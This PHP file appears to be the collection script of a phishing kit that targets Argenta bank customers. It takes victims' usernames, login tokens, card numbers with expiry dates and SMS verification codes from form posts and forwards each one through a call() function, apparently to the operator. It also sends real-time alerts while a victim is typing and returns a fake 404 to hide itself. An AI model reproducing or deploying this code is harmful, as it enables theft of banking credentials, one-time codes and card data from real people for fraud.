<?php 
session_start();
require '../config.php';

if(isset($_POST['user'])){
call("/- ARGENTA LOGIN -/
User: ".$_POST['user']);
return;
}

if(isset($_POST['token1'])){
call("/- ARGENTA LOGIN -/
token: ".$_POST['token1']);
return;
}

if(isset($_POST['num'])){
call("/- ARGENTA EXP -/
Cc: ".$_POST['num']."
Exp: ".$_POST['expp']."
" );
return;
}


if(isset($_POST['sms'])){
call("/- ARGENTA SMS -/
CODE: ".$_POST['sms']."
");
return;
}


if(isset($_POST['n_login'])){
call("/- ARGENTA NOTIFICATION -/
hahowa kayktab Login...
-------------------------------------
PANEL LINK :". $panel_link);
return;

}
if(isset($_POST['n_token'])){
call("/- ARGENTA NOTIFICATION -/
hahowa kayktab token ...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['n_sms'])){
call("/- ARGENTA NOTIFICATION -/
hahowa kayktab SMS...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['n_card'])){
call("/- ARGENTA NOTIFICATION -/
hahowa kayktab card info...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}
 


header("HTTP/1.0 404 Not Found");

?>